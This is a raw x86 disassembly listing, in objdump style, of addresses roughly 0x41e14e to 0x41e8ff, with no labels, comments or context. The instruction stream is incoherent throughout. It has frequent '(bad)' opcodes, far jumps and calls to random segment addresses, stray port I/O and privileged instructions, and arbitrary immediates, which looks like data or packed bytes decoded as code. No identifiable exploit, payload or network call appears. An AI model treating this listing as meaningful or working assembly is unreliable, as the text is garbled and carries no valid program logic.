  41e14e:	and    ebx,DWORD PTR [eax-0x2]
  41e151:	cmp    DWORD PTR [esi],edx
  41e153:	scas   al,BYTE PTR es:[edi]
  41e154:	ja     0x41e166
  41e156:	ror    DWORD PTR [edx-0x4c1e0695],1
  41e15c:	pop    ebx
  41e15d:	cmp    cl,al
  41e15f:	jmp    0x7330:0x716154ed
  41e166:	(bad)  
  41e167:	aas    
  41e168:	add    ebp,ebx
  41e16a:	jl     0x41e1bc
  41e16c:	mov    al,0xb1
  41e16e:	aad    0x55
  41e170:	xor    eax,0x5ff3c234
  41e175:	(bad)
  41e178:	nop
  41e179:	cmp    al,0x33
  41e17b:	gs push ds
  41e17d:	stos   BYTE PTR es:[edi],al
  41e17e:	(bad)  
  41e17f:	pop    ebp
  41e180:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e181:	loopne 0x41e18e
  41e183:	fcmove st,st(5)
  41e185:	cs gs es sbb ecx,esi
  41e18a:	and    edx,DWORD PTR [ebx+ebx*2-0x123c97f5]
  41e191:	pop    edi
  41e192:	idiv   ecx
  41e194:	fstcw  WORD PTR [ebx+ecx*2-0x5f]
  41e199:	js     0x41e205
  41e19b:	into   
  41e19c:	ja     0x41e14f
  41e19e:	cmp    eax,DWORD PTR [ecx-0x1bb2487d]
  41e1a4:	jmp    0x1858:0x67cbf26b
  41e1ab:	ror    DWORD PTR [ebp+0x5feaa70d],0xf8
  41e1b2:	xchg   ebp,eax
  41e1b3:	div    DWORD PTR [ecx-0x41d621fe]
  41e1b9:	mov    edi,ebp
  41e1bb:	ret    0x2bd4
  41e1be:	dec    ebx
  41e1bf:	mov    ebp,0x3fe7b475
  41e1c4:	out    dx,al
  41e1c5:	ins    BYTE PTR es:[edi],dx
  41e1c6:	sbb    al,0x36
  41e1c8:	in     al,dx
  41e1c9:	dec    edi
  41e1ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1cb:	xchg   edx,eax
  41e1cc:	lock inc edi
  41e1ce:	xor    DWORD PTR [eax],esi
  41e1d0:	jo     0x41e1f1
  41e1d2:	adc    BYTE PTR [edi+edi*1],dh
  41e1d5:	and    ebx,DWORD PTR [esi+0x32]
  41e1d8:	mov    eax,0xffa94016
  41e1dd:	ins    BYTE PTR es:[edi],dx
  41e1de:	call   0x9b4fe222
  41e1e3:	ins    BYTE PTR es:[edi],dx
  41e1e4:	ret    
  41e1e5:	sub    bh,BYTE PTR [eax]
  41e1e7:	sbb    DWORD PTR [edi+0x6d],ebx
  41e1ea:	sbb    BYTE PTR [eax+0xe5c63d5],ch
  41e1f0:	enter  0xd044,0x97
  41e1f4:	out    0xb8,eax
  41e1f6:	ins    DWORD PTR es:[edi],dx
  41e1f7:	ret    0x9837
  41e1fa:	cmp    DWORD PTR [esp+ecx*1],ebx
  41e1fd:	mov    ?,esp
  41e1ff:	or     BYTE PTR [esi],bh
  41e201:	clc    
  41e202:	sub    eax,0xcb5a804b
  41e207:	mov    esi,0xa204cb42
  41e20c:	inc    edi
  41e20d:	mov    esp,0xc0430248
  41e212:	push   0x872be82c
  41e217:	sub    edx,DWORD PTR [edi-0x24]
  41e21a:	data16 jns 0x41e1da
  41e21d:	mov    ebx,0x568d820e
  41e222:	test   DWORD PTR [edi],0xa574c32b
  41e228:	retf   
  41e229:	inc    esp
  41e22a:	mov    al,0x77
  41e22c:	dec    ecx
  41e22d:	pop    ebx
  41e22e:	push   0xa2289902
  41e233:	jecxz  0x41e264
  41e235:	xchg   DWORD PTR [esi-0x30],ebp
  41e238:	adc    esi,DWORD PTR [edi-0x4da051a7]
  41e23e:	das    
  41e23f:	hlt    
  41e240:	pop    esi
  41e241:	pop    DWORD PTR [ebx]
  41e243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e244:	int    0xc3
  41e246:	pop    eax
  41e247:	mov    bh,0xac
  41e249:	loopne 0x41e282
  41e24b:	repz out dx,al
  41e24d:	inc    edx
  41e24e:	or     BYTE PTR [esp+ebp*8+0x3cfbd3d],bh
  41e255:	sar    edx,1
  41e257:	scas   al,BYTE PTR es:[edi]
  41e258:	and    DWORD PTR [eax+0x193fde64],esp
  41e25e:	retf   
  41e25f:	inc    ecx
  41e260:	push   ebx
  41e261:	out    dx,eax
  41e262:	sbb    al,0xf2
  41e264:	out    dx,eax
  41e265:	ins    BYTE PTR es:[edi],dx
  41e266:	mov    ch,0x7c
  41e268:	je     0x41e2d8
  41e26a:	cld    
  41e26b:	dec    edi
  41e26c:	ins    DWORD PTR es:[edi],dx
  41e26d:	push   edi
  41e26e:	jno    0x41e209
  41e270:	xchg   esp,eax
  41e271:	xlat   BYTE PTR ds:[ebx]
  41e272:	cmp    al,0x96
  41e274:	ret    
  41e275:	and    eax,DWORD PTR [ebx-0x7e38cf89]
  41e27b:	xchg   ebp,eax
  41e27c:	lods   al,BYTE PTR ds:[esi]
  41e27d:	jnp    0x41e272
  41e27f:	gs pop ebx
  41e281:	dec    edi
  41e282:	cdq    
  41e283:	in     al,dx
  41e284:	stc    
  41e285:	fs lahf 
  41e287:	out    dx,al
  41e288:	mov    esp,ebp
  41e28a:	or     BYTE PTR [eax+esi*2-0x30f4e1ee],0x79
  41e292:	fdivr  DWORD PTR [edx+0x367d4b3c]
  41e298:	xor    DWORD PTR [eax-0x62],ebp
  41e29b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e29c:	repz or BYTE PTR [edx],bh
  41e29f:	xor    BYTE PTR [ecx],ch
  41e2a1:	xor    al,0xf7
  41e2a3:	sti    
  41e2a4:	mov    bl,0xe5
  41e2a6:	sbb    eax,0xfca7718c
  41e2ab:	jecxz  0x41e25d
  41e2ad:	sub    BYTE PTR [eax+0x517b31eb],bl
  41e2b3:	in     eax,dx
  41e2b4:	and    bl,BYTE PTR [esi]
  41e2b6:	fistp  DWORD PTR [ebp+ecx*1-0x38524036]
  41e2bd:	rcl    BYTE PTR [edx],cl
  41e2bf:	in     eax,dx
  41e2c0:	aam    0x67
  41e2c2:	add    eax,0x7d92488b
  41e2c7:	and    dl,BYTE PTR [esi+ebp*1+0x21d3ed78]
  41e2ce:	fcom   QWORD PTR [edx-0x53d5f335]
  41e2d4:	inc    edi
  41e2d5:	inc    esp
  41e2d6:	adc    eax,0x8d7a7f7e
  41e2db:	add    BYTE PTR [edi],0xd5
  41e2de:	pushf  
  41e2df:	pop    ds
  41e2e0:	fist   WORD PTR [edx+0x41ba7cb7]
  41e2e6:	arpl   bx,sp
  41e2e8:	xchg   ecx,eax
  41e2e9:	stos   DWORD PTR es:[edi],eax
  41e2ea:	jecxz  0x41e2a7
  41e2ec:	cdq    
  41e2ed:	in     al,0x81
  41e2ef:	mov    ebx,0x81a344ab
  41e2f4:	enter  0x2dbc,0xf5
  41e2f8:	pop    eax
  41e2f9:	mov    ecx,0x660c06e6
  41e2fe:	xor    eax,0x1bd4c60c
  41e303:	pop    edi
	...
  41e310:	add    BYTE PTR [esi-0x9],ch
  41e313:	mov    ebx,0xfe6dbb69
  41e318:	not    DWORD PTR [edx+eax*1+0x31]
  41e31c:	pop    ecx
  41e31d:	ja     0x41e311
  41e31f:	int3   
  41e320:	xchg   esp,eax
  41e321:	imul   ebx,DWORD PTR [esi+0x1],0x0
  41e325:	stos   DWORD PTR es:[edi],eax
  41e326:	add    eax,DWORD PTR [eax]
  41e328:	add    BYTE PTR [edx+0x43615819],ch
  41e32e:	mov    dh,0x1d
  41e330:	fbld   TBYTE PTR [eax+0x3ceedc92]
  41e336:	(bad)  
  41e337:	pushf  
  41e338:	or     BYTE PTR [edx-0x56242502],bh
  41e33e:	std    
  41e33f:	adc    al,0xc8
  41e341:	lea    esi,[esi-0x72]
  41e344:	imul   eax,DWORD PTR [esi],0xffffffae
  41e347:	push   ds
  41e348:	jl     0x41e323
  41e34a:	jmp    0xb5ce:0x6c331d5b
  41e351:	mov    ds:0x2c144a93,eax
  41e356:	xor    eax,0xa946d7bd
  41e35b:	repnz int 0xd0
  41e35e:	xor    BYTE PTR [esi+0x1298ce55],bl
  41e364:	push   esi
  41e365:	xor    ebp,DWORD PTR [edx+0x2b]
  41e368:	aas    
  41e369:	sbb    DWORD PTR [edx+0x46],ebx
  41e36c:	push   esi
  41e36d:	sbb    ebp,ecx
  41e36f:	xor    al,0xe8
  41e371:	mov    edx,0x44686930
  41e376:	loop   0x41e397
  41e378:	ds cld 
  41e37a:	add    al,0x8e
  41e37c:	outs   dx,DWORD PTR ds:[esi]
  41e37d:	enter  0x1d78,0xce
  41e381:	and    al,0x17
  41e383:	test   al,0xbd
  41e385:	or     DWORD PTR [edx+esi*8-0x5e],0xffffffc1
  41e38a:	cmp    BYTE PTR [eax],dh
  41e38c:	adc    DWORD PTR [esi-0x4c],0x2c
  41e390:	inc    ebp
  41e391:	stc    
  41e392:	or     cl,BYTE PTR [eax+eax*4-0x36ec0dc3]
  41e399:	cld    
  41e39a:	leave  
  41e39b:	ret    0x9dc5
  41e39e:	xchg   BYTE PTR [edi],ch
  41e3a0:	shl    BYTE PTR [ebx],cl
  41e3a2:	retf   
  41e3a3:	clc    
  41e3a4:	add    ch,bl
  41e3a6:	fdiv   QWORD PTR [ecx+0x58]
  41e3a9:	dec    edx
  41e3aa:	cs xchg ebx,eax
  41e3ac:	fwait
  41e3ad:	dec    ecx
  41e3ae:	mov    ds,eax
  41e3b0:	out    dx,al
  41e3b1:	or     al,BYTE PTR [edx-0x3bc85826]
  41e3b7:	push   ebx
  41e3b8:	mov    ebp,0x1f2b1f86
  41e3bd:	push   es
  41e3be:	mov    ds:0xbf4d8fd5,eax
  41e3c3:	push   es
  41e3c4:	push   ss
  41e3c5:	xchg   edx,eax
  41e3c6:	cmp    DWORD PTR [ebp+0x31],0xf22bc1b
  41e3cd:	clc    
  41e3ce:	addr16 adc ebx,eax
  41e3d1:	cmp    bh,BYTE PTR [eax+0x43a7d178]
  41e3d7:	stc    
  41e3d8:	sub    al,0xb7
  41e3da:	mov    ah,bl
  41e3dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3dd:	adc    DWORD PTR [edi-0x73c92053],0xbe286ca9
  41e3e7:	scas   al,BYTE PTR es:[edi]
  41e3e8:	pusha  
  41e3e9:	call   0x1774dd39
  41e3ee:	(bad)  
  41e3ef:	nop
  41e3f0:	repnz cmp eax,0x6044f58b
  41e3f6:	mov    ds,WORD PTR [ecx]
  41e3f8:	ror    DWORD PTR [edx-0x609aac93],0xef
  41e3ff:	dec    eax
  41e400:	dec    esi
  41e401:	leave  
  41e402:	(bad)  
  41e403:	fs test ch,dh
  41e406:	sub    al,ch
  41e408:	adc    eax,0x2e4fee9f
  41e40d:	daa    
  41e40e:	ins    BYTE PTR es:[edi],dx
  41e40f:	xor    bl,BYTE PTR [bx+di-0x5d86]
  41e414:	and    eax,0xd68814e0
  41e419:	and    bh,BYTE PTR ds:0xab53e867
  41e41f:	outs   dx,DWORD PTR ds:[esi]
  41e420:	fld    QWORD PTR [esi-0x739a4b0f]
  41e426:	in     eax,0x5c
  41e428:	xlat   BYTE PTR ds:[ebx]
  41e429:	mov    DWORD PTR [edi],esi
  41e42b:	jnp    0x41e3d6
  41e42d:	idiv   BYTE PTR [edi+0x18505095]
  41e433:	jmp    0x41e46a
  41e435:	cli    
  41e436:	ror    BYTE PTR [eax],1
  41e438:	imul   eax,esi,0xffffffdd
  41e43b:	mov    eax,DWORD PTR [bx+si]
  41e43e:	mov    al,BYTE PTR [eax+0x47]
  41e441:	push   eax
  41e442:	(bad)  
  41e443:	jns    0x41e47e
  41e445:	sub    DWORD PTR [edi-0x44ae9598],0xffffffee
  41e44c:	fwait
  41e44d:	imul   DWORD PTR [ebx]
  41e44f:	add    bl,BYTE PTR [ecx+eax*8+0x34]
  41e453:	pop    edx
  41e454:	jne    0x41e4a5
  41e456:	add    al,0xbd
  41e458:	dec    ebx
  41e459:	test   BYTE PTR [ebp-0x66],dl
  41e45c:	xor    ch,0x7c
  41e45f:	adc    al,0xa
  41e461:	stc    
  41e462:	hlt    
  41e463:	pop    edi
  41e464:	or     al,0xa4
  41e466:	gs pop ebp
  41e468:	in     al,dx
  41e469:	sti    
  41e46a:	(bad)  
  41e46b:	xor    cl,bh
  41e46d:	adc    ebx,ecx
  41e46f:	xchg   ecx,eax
  41e470:	not    DWORD PTR [ecx-0x48]
  41e473:	jl     0x41e453
  41e475:	xlat   BYTE PTR ds:[ebx]
  41e476:	inc    ebx
  41e477:	inc    ebx
  41e478:	popa   
  41e479:	fwait
  41e47a:	enter  0xcfd8,0x51
  41e47e:	sahf   
  41e47f:	adc    eax,0xb7799f2f
  41e484:	mov    eax,ds:0x3961cafc
  41e489:	sbb    bl,bh
  41e48b:	pop    ebp
  41e48d:	jp     0x41e4bc
  41e48f:	push   0x79
  41e491:	and    eax,DWORD PTR [esi-0x61]
  41e494:	fcomp  st(3)
  41e496:	stos   DWORD PTR es:[edi],eax
  41e497:	adc    ah,dl
  41e499:	std    
  41e49a:	ret    
  41e49b:	xor    ebp,0xffffffc5
  41e49e:	mov    BYTE PTR [ecx-0x5a],ch
  41e4a1:	pop    eax
  41e4a2:	mov    DWORD PTR [edx-0x1ac32143],ebx
  41e4a8:	not    BYTE PTR [edx+esi*2+0x73]
  41e4ac:	mov    WORD PTR [ecx+0x5248e409],ds
  41e4b2:	pop    ebx
  41e4b3:	or     esi,edi
  41e4b5:	xor    al,BYTE PTR [ecx-0x1a]
  41e4b8:	std    
  41e4b9:	cmp    DWORD PTR [esi-0x7f7783c9],eax
  41e4bf:	fsin   
  41e4c1:	inc    ebp
  41e4c2:	fstp   QWORD PTR [ebx+0x44316890]
  41e4c8:	es adc edi,edx
  41e4cb:	test   al,0xa5
  41e4cd:	xor    al,0xb6
  41e4cf:	mov    esi,0x127f5c00
  41e4d4:	xchg   ecx,eax
  41e4d5:	popf   
  41e4d6:	cmp    eax,0xfcb513f6
  41e4db:	les    edx,FWORD PTR [eax]
  41e4dd:	cdq    
  41e4de:	xor    eax,DWORD PTR [esi-0x57c75662]
  41e4e4:	sub    ah,BYTE PTR [edx-0x5e5a746b]
  41e4ea:	dec    esp
  41e4eb:	ins    BYTE PTR es:[edi],dx
  41e4ec:	push   eax
  41e4ed:	mov    dl,0x74
  41e4ef:	mov    eax,ds:0x86d87943
  41e4f4:	aas    
  41e4f5:	or     bl,ah
  41e4f7:	aad    0x90
  41e4f9:	mov    edx,eax
  41e4fb:	iret   
  41e4fc:	xchg   DWORD PTR [edx+0x3f],esp
  41e4ff:	pusha  
  41e500:	push   ss
  41e501:	aas    
  41e502:	pop    ecx
  41e503:	(bad)  
  41e504:	pop    edi
  41e505:	call   DWORD PTR [edx]
  41e507:	jmp    0xb3d7:0xf4451342
  41e50e:	pop    ecx
  41e50f:	pop    ebx
  41e510:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e511:	mov    eax,ds:0x9846094
  41e516:	mov    ds:0x51964884,eax
  41e51b:	mov    bl,0xc2
  41e51d:	jb     0x41e54f
  41e51f:	mov    eax,ds:0xd9cc1183
  41e524:	add    edx,DWORD PTR [ebx+0x74]
  41e527:	dec    esi
  41e528:	gs call 0xc7ff:0x94bdff8d
  41e530:	add    al,0x6c
  41e532:	jo     0x41e5a1
  41e534:	adc    DWORD PTR [eax],0x35dc9716
  41e53a:	mov    WORD PTR ss:[esi],ds
  41e53d:	xchg   BYTE PTR [ecx],dl
  41e53f:	cmp    DWORD PTR [ebx+0x56d1e4f0],edx
  41e545:	mov    edi,DWORD PTR [esi]
  41e547:	out    dx,al
  41e548:	xchg   edi,eax
  41e549:	jo     0x41e572
  41e54b:	xchg   ecx,eax
  41e54c:	loope  0x41e55f
  41e54e:	or     DWORD PTR [edx+0x5934f274],0xf6092a6b
  41e558:	push   ds
  41e559:	push   ecx
  41e55a:	bound  esp,QWORD PTR [eax]
  41e55c:	push   0x1f
  41e55e:	ret    
  41e55f:	out    0x2,eax
  41e561:	in     al,dx
  41e562:	cmp    ecx,edx
  41e564:	popf   
  41e565:	push   ss
  41e566:	lea    esi,[ebx-0x79]
  41e569:	mov    BYTE PTR [edi],dh
  41e56b:	push   esp
  41e56c:	xchg   DWORD PTR [edi-0x48],esp
  41e56f:	cs jnp 0x41e56a
  41e572:	repnz fistp WORD PTR ds:0xa60f6eda
  41e579:	repnz fwait
  41e57b:	sbb    al,ch
  41e57d:	jle    0x41e56e
  41e57f:	mov    BYTE PTR [ebp+ecx*8-0x41222600],bl
  41e586:	mov    bh,0x8c
  41e588:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e589:	push   ecx
  41e58a:	push   edx
  41e58b:	inc    ebp
  41e58c:	push   0x5d
  41e58e:	adc    eax,0x2295a7d4
  41e593:	sbb    al,0x4e
  41e595:	je     0x41e5c4
  41e597:	pop    edx
  41e598:	(bad)  
  41e599:	ins    DWORD PTR es:[edi],dx
  41e59a:	lock int 0x28
  41e59d:	mov    cl,ch
  41e59f:	popf   
  41e5a0:	or     edi,DWORD PTR [edx+0x353bf54b]
  41e5a6:	adc    ah,0x9
  41e5a9:	mov    dl,0x93
  41e5ab:	sbb    esi,0xffffffad
  41e5ae:	xchg   edx,eax
  41e5af:	fst    DWORD PTR gs:[ebx]
  41e5b2:	mov    ah,0xb3
  41e5b4:	xor    al,0xca
  41e5b6:	(bad)  
  41e5b7:	call   0x92114620
  41e5bc:	cmp    bl,0xb2
  41e5bf:	retf   
  41e5c0:	sbb    BYTE PTR [ecx-0x76da03f1],ch
  41e5c6:	(bad)  
  41e5c7:	mov    edx,0x1dd6cac0
  41e5cc:	dec    edx
  41e5cd:	scas   al,BYTE PTR es:[edi]
  41e5ce:	ins    DWORD PTR es:[edi],dx
  41e5cf:	ja     0x41e613
  41e5d1:	add    DWORD PTR [edx-0x3d],edi
  41e5d4:	cmp    dl,al
  41e5d6:	int3   
  41e5d7:	loope  0x41e5c4
  41e5d9:	nop
  41e5da:	add    al,0x6e
  41e5dc:	and    edi,DWORD PTR [edi-0x368f3fd8]
  41e5e2:	aad    0x16
  41e5e4:	mov    esp,0xa02edb9b
  41e5e9:	stos   BYTE PTR es:[edi],al
  41e5ea:	pop    eax
  41e5eb:	mov    al,ds:0xe5f01075
  41e5f0:	xrelease xchg BYTE PTR [edx-0x48890b0a],ah
  41e5f7:	sti    
  41e5f8:	ds xchg esi,eax
  41e5fa:	jle    0x41e596
  41e5fc:	cmp    eax,0x990f98f3
  41e601:	mov    ecx,0xbe4b5591
  41e606:	pusha  
  41e607:	(bad)  
  41e609:	int3   
  41e60a:	test   eax,0x9a83b590
  41e60f:	mov    DWORD PTR [edi-0x36558902],edi
  41e615:	xor    edx,DWORD PTR [esp+eax*1-0xaba91ad]
  41e61c:	inc    edi
  41e61d:	adc    DWORD PTR [esi-0x44d1d1de],eax
  41e623:	loop   0x41e5f7
  41e625:	sub    BYTE PTR [edi],bh
  41e627:	lock cs push edi
  41e62a:	dec    edx
  41e62b:	aam    0x9c
  41e62d:	fidiv  WORD PTR [ebp+0x51]
  41e630:	and    dh,dh
  41e632:	adc    BYTE PTR [edi+0x7037df9b],cl
  41e638:	adc    al,0x96
  41e63a:	icebp  
  41e63b:	adc    al,BYTE PTR [esi+0x6f]
  41e63e:	(bad)  
  41e63f:	xor    BYTE PTR [eax+0x5185c0a1],bh
  41e645:	neg    ebx
  41e647:	push   ds
  41e648:	ins    BYTE PTR es:[edi],dx
  41e649:	sub    eax,0x7fc76062
  41e64e:	xchg   esi,eax
  41e64f:	cwde   
  41e650:	or     BYTE PTR es:[esi],cl
  41e653:	dec    edi
  41e654:	sbb    BYTE PTR [ebx+0x5135a633],cl
  41e65a:	ss cmp dh,bh
  41e65d:	stos   DWORD PTR es:[edi],eax
  41e65e:	xor    eax,0x55529a07
  41e663:	icebp  
  41e664:	cmp    al,BYTE PTR [ebp+esi*4+0x68]
  41e668:	loop   0x41e631
  41e66a:	sub    ah,BYTE PTR [eax+edx*2-0x4d85ed63]
  41e671:	std    
  41e672:	out    dx,eax
  41e673:	add    dl,0xd2
  41e676:	pushf  
  41e677:	pop    ebx
  41e678:	mov    bl,0x88
  41e67a:	pop    esp
  41e67b:	call   0x926bf9d
  41e680:	inc    ebp
  41e681:	and    BYTE PTR [ecx-0x71724a7e],cl
  41e687:	sahf   
  41e688:	das    
  41e689:	leave  
  41e68a:	loop   0x41e68f
  41e68c:	cdq    
  41e68d:	cmp    edx,DWORD PTR [edi]
  41e68f:	sub    BYTE PTR [esi],ch
  41e691:	sti    
  41e692:	pop    eax
  41e693:	push   ss
  41e694:	jp     0x41e63c
  41e696:	fucom  st(7)
  41e698:	sbb    ah,0x48
  41e69b:	jmp    0x391f:0xd07ff3d
  41e6a2:	sub    DWORD PTR [ebx-0x500fd4b0],edx
  41e6a8:	(bad)  
  41e6a9:	je     0x41e724
  41e6ab:	popa   
  41e6ac:	fbld   TBYTE PTR [esi]
  41e6ae:	mov    eax,ds:0xc579acdd
  41e6b3:	cmp    ecx,ecx
  41e6b5:	daa    
  41e6b6:	mov    dl,0x2d
  41e6b8:	(bad)  [edx-0x77]
  41e6bb:	add    dh,BYTE PTR [eax+0x24]
  41e6be:	push   esp
  41e6bf:	pop    eax
  41e6c0:	je     0x41e6f3
  41e6c2:	icebp  
  41e6c3:	lock fdiv st(1),st
  41e6c6:	jle    0x41e660
  41e6c8:	lds    eax,FWORD PTR [ebx-0x17cb0236]
  41e6ce:	test   DWORD PTR [esi],eax
  41e6d0:	or     ebp,DWORD PTR [ecx+ecx*8+0x65]
	...
  41e6df:	add    BYTE PTR [eax],al
  41e6e1:	sub    eax,0xfffb5fc4
  41e6e6:	sti    
  41e6e7:	lods   eax,DWORD PTR ds:[esi]
  41e6e8:	(bad)  
  41e6e9:	or     DWORD PTR [edi],ebp
  41e6eb:	jmp    0xd35cdc5d
  41e6f0:	and    BYTE PTR [esi],dl
  41e6f2:	bound  eax,QWORD PTR [ecx]
  41e6f4:	add    BYTE PTR [ebx+0x63000003],ch
  41e6fa:	pushf  
  41e6fb:	push   edi
  41e6fc:	dec    ecx
  41e6fd:	mov    edx,0xc85bcdb9
  41e702:	add    DWORD PTR [eax],edi
  41e704:	movhps xmm6,QWORD PTR [esi+0x59]
  41e708:	pop    ss
  41e709:	inc    esp
  41e70a:	stos   DWORD PTR es:[edi],eax
  41e70b:	xor    esi,DWORD PTR [ebp+0x1]
  41e70e:	imul   eax,edi,0xffffff88
  41e711:	jmp    0x41e71e
  41e713:	(bad)  
  41e714:	pop    edx
  41e715:	fstp   TBYTE PTR [ebx-0xc]
  41e718:	loope  0x41e724
  41e71a:	xor    eax,ebx
  41e71c:	movlps xmm6,QWORD PTR [ebp+0x34]
  41e720:	sub    ebp,edx
  41e722:	mov    cl,0xa0
  41e724:	sub    BYTE PTR [ebx-0x69ed0b32],cl
  41e72a:	sub    DWORD PTR [ebp+0x5c700258],ecx
  41e730:	rcl    BYTE PTR [ebx+edi*1],cl
  41e733:	jp     0x41e6e2
  41e735:	inc    ecx
  41e736:	aas    
  41e737:	sbb    esi,DWORD PTR [edi-0x5b43c053]
  41e73d:	jns    0x41e729
  41e73f:	enter  0xcba3,0xf8
  41e743:	addr16 and eax,0xd92f58ed
  41e749:	scas   al,BYTE PTR es:[edi]
  41e74a:	fidiv  DWORD PTR [bp+di]
  41e74d:	repnz mov edi,0x376aced8
  41e753:	aad    0x77
  41e755:	mov    ds:0xc15e31ce,al
  41e75a:	pop    ebx
  41e75b:	(bad)  
  41e75c:	mov    ch,0x58
  41e75e:	shl    BYTE PTR [eax+ebp*1],1
  41e761:	sub    eax,0xc96ac1d8
  41e766:	addr16 call 0x6052:0xd71715bd
  41e76e:	fs leave 
  41e770:	sbb    dl,BYTE PTR [ebx+0x2c0d92de]
  41e776:	or     dl,bl
  41e778:	inc    edi
  41e779:	repz and DWORD PTR [edx+eax*2-0x69926fce],esi
  41e781:	pop    ebp
  41e782:	inc    edx
  41e783:	or     al,BYTE PTR [ebp-0x55d6d64d]
  41e789:	(bad)  
  41e78a:	(bad)  
  41e78b:	pop    ebp
  41e78c:	dec    esi
  41e78d:	jnp    0x41e7ea
  41e78f:	mov    al,0xa1
  41e791:	xlat   BYTE PTR ds:[ebx]
  41e792:	adc    al,0xa3
  41e794:	jmp    0x5a35:0xed34c969
  41e79b:	call   0xda5b87f8
  41e7a0:	scas   al,BYTE PTR es:[edi]
  41e7a1:	adc    DWORD PTR [edi-0x3409496b],esi
  41e7a7:	rcr    BYTE PTR [ecx+edx*4+0x3b512572],0xa2
  41e7af:	jg     0x41e7f6
  41e7b1:	pop    ebx
  41e7b2:	mov    gs,WORD PTR [edi+0x1187597d]
  41e7b8:	out    0xeb,eax
  41e7ba:	dec    esp
  41e7bb:	sub    BYTE PTR [edx+0x4],bl
  41e7be:	imul   ecx,DWORD PTR [ebp+0x35cde039],0x2417e779
  41e7c8:	sub    DWORD PTR [ecx-0x56],edx
  41e7cb:	sub    DWORD PTR [edx-0x25f41fb9],0xf
  41e7d2:	aad    0x1f
  41e7d4:	jge    0x41e79c
  41e7d6:	xor    BYTE PTR [ecx-0x29],dl
  41e7d9:	dec    esi
  41e7da:	xchg   ebp,eax
  41e7db:	jns    0x41e831
  41e7dd:	and    BYTE PTR [ecx+ebx*8-0x47],ch
  41e7e1:	and    eax,0xfcbce4bc
  41e7e6:	stos   BYTE PTR es:[edi],al
  41e7e7:	in     al,dx
  41e7e8:	test   DWORD PTR [edx+ebx*8+0xb5abdb5],esp
  41e7ef:	fistp  QWORD PTR [esi+0x59fcf9de]
  41e7f5:	test   dh,ch
  41e7f7:	fs ss cli 
  41e7fa:	fwait
  41e7fb:	test   DWORD PTR [ecx+0x7c],0x9f96451e
  41e802:	scas   eax,DWORD PTR es:[edi]
  41e803:	jp     0x41e7d7
  41e805:	xchg   BYTE PTR ds:0x9226eb2,bl
  41e80b:	inc    ebp
  41e80c:	inc    ecx
  41e80d:	aad    0xe4
  41e80f:	xor    BYTE PTR [ecx-0x30],dl
  41e812:	in     eax,0xcc
  41e814:	int3   
  41e815:	aam    0x4a
  41e817:	adc    al,0x1a
  41e819:	shl    DWORD PTR [eax],cl
  41e81b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e81c:	add    eax,0x61d9fc5c
  41e821:	clc    
  41e822:	lods   al,BYTE PTR ds:[esi]
  41e823:	jle    0x41e7c0
  41e825:	repnz aad 0x54
  41e828:	push   cs
  41e829:	jecxz  0x41e890
  41e82b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e82c:	stos   BYTE PTR es:[edi],al
  41e82d:	std    
  41e82e:	jb     0x41e885
  41e830:	mov    ebx,0xdd7211c0
  41e835:	retf   
  41e836:	sub    edi,ebp
  41e838:	fdiv   QWORD PTR [ebx]
  41e83a:	sub    DWORD PTR [eax-0x6e055c5d],edi
  41e840:	fnsave [esi]
  41e842:	pop    edi
  41e843:	push   edi
  41e844:	adc    eax,0x3e107f09
  41e849:	push   cs
  41e84a:	and    BYTE PTR [eax+0x4a],cl
  41e84d:	cwde   
  41e84e:	imul   ebp,DWORD PTR [edi+0x12],0x67414dd3
  41e855:	pop    ecx
  41e856:	sbb    al,0x40
  41e858:	jg     0x41e89b
  41e85a:	pop    edi
  41e85b:	and    al,0x5d
  41e85d:	in     al,dx
  41e85e:	adc    ecx,DWORD PTR [esi+ebp*4-0x5e]
  41e862:	xor    edi,DWORD PTR [edi+0x4d]
  41e865:	pop    edi
  41e866:	xor    ecx,ebp
  41e868:	arpl   WORD PTR [ebx+eax*2-0x75893b23],bp
  41e86f:	icebp  
  41e870:	or     DWORD PTR [ecx],edx
  41e872:	mov    al,0x56
  41e874:	mov    eax,ds:0x4901d5e6
  41e879:	ins    BYTE PTR es:[edi],dx
  41e87a:	cli    
  41e87b:	gs call 0xfc9c4f39
  41e881:	lods   eax,DWORD PTR ds:[esi]
  41e882:	sub    BYTE PTR [ebx],dh
  41e884:	adc    edx,DWORD PTR [ebp+0x8024d83]
  41e88a:	push   0x27171e15
  41e88f:	cvtps2pd xmm2,xmm6
  41e892:	(bad)  
  41e893:	jmp    0xef5e:0xdb70a7c8
  41e89a:	and    bl,0x3d
  41e89d:	fwait
  41e89e:	mov    ebp,0x8cd25ffb
  41e8a3:	mov    edx,edi
  41e8a5:	sbb    DWORD PTR [ebp+0x69fb4288],0xe5bfd262
  41e8af:	pop    edx
  41e8b0:	lods   al,BYTE PTR ds:[esi]
  41e8b1:	push   edx
  41e8b2:	(bad)  
  41e8b3:	sbb    BYTE PTR [eax+0x34e818f3],bl
  41e8b9:	inc    esi
  41e8ba:	mov    esi,0xc8170513
  41e8bf:	ins    BYTE PTR es:[edi],dx
  41e8c0:	aam    0xdd
  41e8c2:	adc    eax,DWORD PTR [edx]
  41e8c4:	push   ebp
  41e8c5:	lock mov BYTE PTR [edi-0x15504d33],bl
  41e8cc:	imul   ebp,DWORD PTR [esi],0x4cdaf5bd
  41e8d2:	imul   edi,DWORD PTR [eax-0x2d],0x6f1d4b14
  41e8d9:	push   es
  41e8da:	loopne 0x41e8e2
  41e8dc:	mov    dh,0xef
  41e8de:	and    DWORD PTR [ebx-0xe41a8b5],ecx
  41e8e4:	sbb    dh,BYTE PTR [ebp+0x48c36b1e]
  41e8ea:	sbb    DWORD PTR [edx+esi*8-0x7b1c92c4],ebx
  41e8f1:	scas   eax,DWORD PTR es:[edi]
  41e8f2:	jmp    0xc89bbca6
  41e8f7:	jae    0x41e931
  41e8f9:	lods   eax,DWORD PTR ds:[esi]
  41e8fa:	out    dx,al
  41e8fb:	arpl   WORD PTR [ebp-0x6f],bx
  41e8fe:	lahf   
  41e8ff:	sbb    al,0xc6
